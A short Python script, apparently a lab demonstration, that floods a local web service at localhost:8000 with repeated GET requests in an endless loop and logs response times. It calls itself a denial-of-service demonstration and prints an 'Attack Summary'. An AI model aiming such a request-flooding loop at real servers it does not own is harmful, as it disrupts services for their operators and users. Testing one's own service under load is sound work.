import logging
import requests
import time
import statistics
import sys

# Configure colored logging
try:
    import colorlog
    
    handler = colorlog.StreamHandler()
    handler.setFormatter(colorlog.ColoredFormatter(
        '%(log_color)s%(asctime)s - %(message)s',
        log_colors={
            'INFO': 'green',
            'WARNING': 'yellow',
            'ERROR': 'red',
            'CRITICAL': 'red,bg_white',
        }
    ))
    
    logger = colorlog.getLogger()
    logger.setLevel(logging.INFO)
    logger.handlers = [handler]
except ImportError:
    # Fallback to standard logging if colorlog is not installed
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        datefmt='%H:%M:%S'
    )
    logger = logging.getLogger()
    print("For colored logs, install colorlog: pip install colorlog")

# TARGET_URL = "http://127.0.0.1:8000"  # Change this to your local server's port
TARGET_URL = "http://localhost:8000/get_definition_service/?style=Shakespeare&word=test"  # Change this to your local server's port

# Statistics tracking
request_count = 0
response_times = []
summary_interval = 10  # Show summary every N requests

print(f"Starting DoS demonstration against {TARGET_URL}")
print("Press Ctrl+C to stop the attack\n")

while True:
    try:
        start_time = time.time()
        response = requests.get(TARGET_URL)
        end_time = time.time()
        response_time = end_time - start_time
        
        request_count += 1
        response_times.append(response_time)
        
        # Only log detailed info at intervals to reduce spam
        if request_count % summary_interval == 0:
            avg_time = statistics.mean(response_times[-summary_interval:])
            max_time = max(response_times[-summary_interval:])
            
            logger.info(f"Request #{request_count} | Status: {response.status_code} | "
                       f"Last: {response_time:.4f}s | Avg: {avg_time:.4f}s | Max: {max_time:.4f}s")
            
            # Clear old response times to prevent memory buildup during long runs
            if len(response_times) > 1000:
                response_times = response_times[-100:]
    except KeyboardInterrupt:
        # Calculate final statistics
        avg_time = statistics.mean(response_times) if response_times else 0
        max_time = max(response_times) if response_times else 0
        
        print("\n" + "="*50)
        print(f"Attack Summary:")
        print(f"Total Requests: {request_count}")
        print(f"Average Response Time: {avg_time:.4f}s")
        print(f"Maximum Response Time: {max_time:.4f}s")
        print("="*50)
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
